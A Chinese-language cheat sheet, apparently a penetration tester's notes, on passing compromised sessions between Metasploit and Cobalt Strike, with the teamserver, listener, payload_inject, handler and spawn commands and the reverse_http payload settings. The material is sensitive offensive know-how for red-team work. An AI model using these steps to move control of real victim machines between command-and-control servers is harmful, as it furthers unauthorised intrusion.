## MSF与CS互传sessions会话

一、msf—>cs

- msf连接cs
  - 1.在队伍服务器上启动cs服务端
    - ./teamserver 团队服务器ip 连接密码
  - 2.cs客户端连接攻击机
    - 填团队服务器ip和密码，名字随便
- msf将session发往cs客户端
  - 1.cs设置监听
    - 监听器 - add
      - 选择payload类型和填攻击机ip，端口要对应payload类型
  - 2.进入payload注入模块
    - use exploit/windows/local/payload_inject
  - 3.设置参数
    - set disablepayloadhandler 1
      - 1开启
    - set payload 第一步选的payload类型
      - 后面的协议类型一致
        示例：
        设置的payload是windows/meterpreter/reverse_http
        cs选择的payload是windows/beacon_http/reverse_http
    - set lhost
      - msf本机ip
    - set lport
      - 与第一步对应
    - set session
      - 目标机的session id
  - 4.运行
    - run
      - cs即可收到session
    - exploit也可
      - -j 是隐藏到后台运行，jobs调出
      - -z 是连接后不进入终端



二、cs—>msf

- cs将shell转发给另一msf

  最好用公网机器，内网机器要转发端口

  - 1.进入handle模块
  - 2.设置handle参数
    - set payload xxxxx
      - 全部要一致
    - set lhost
      - 本机
    - set lport
      - 任意一个，注意不要重复
  - 3.cs设置spwan
    - 1.add 新会话
    - 2.设置参数
      - msf所在对应的ip和端口
      - payload选foreign
    - 3.右键session，选择派生会话
      - 选择第二步设置的会话
  - 4.exploit 运行
    - 即可收到cs派生的session

<img src="C:\Users\gxc\Desktop\1899916-20200505225002407-512959716.png" alt="img" style="zoom: 200%;" />